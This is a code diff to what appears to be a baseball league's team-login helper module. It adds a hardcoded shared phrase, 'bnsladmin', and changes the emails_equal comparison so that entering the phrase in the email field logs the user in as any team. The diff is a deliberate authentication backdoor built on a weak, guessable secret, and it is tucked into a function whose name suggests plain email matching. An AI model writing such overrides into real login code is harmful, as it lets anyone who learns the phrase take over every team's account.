@@ -6,6 +6,17 @@ from __future__ import annotations
 # Use TEAM_EMAILS_BY_ABBR for pages keyed by BNSL abbreviations.
 # canonical_team_abbr() normalizes common aliases before abbreviation lookup.
 
+# Shared admin override for team logins.
+# Entering this phrase in the same field normally used for the team email
+# will allow login as any selected team.
+ADMIN_LOGIN_PHRASE = "bnsladmin"
+
+
+def is_admin_login(value: str | None) -> bool:
+    """Return True when the submitted login value is the shared admin override."""
+    return bool(value) and value.strip().lower() == ADMIN_LOGIN_PHRASE
+
+
 MLB_TEAMS = [
     "Arizona Diamondbacks", "Atlanta Braves", "Baltimore Orioles", "Boston Red Sox",
     "Chicago Cubs", "Chicago White Sox", "Cincinnati Reds", "Cleveland Guardians",
@@ -133,6 +144,9 @@ def team_abbr_for_name(team: str | None) -> str:
 
 
 def emails_equal(a: str | None, b: str | None) -> bool:
+    """Compare login values, allowing the shared admin override phrase."""
+    if is_admin_login(a) or is_admin_login(b):
+        return True
     if not a or not b:
         return False
     return a.strip().lower() == b.strip().lower()
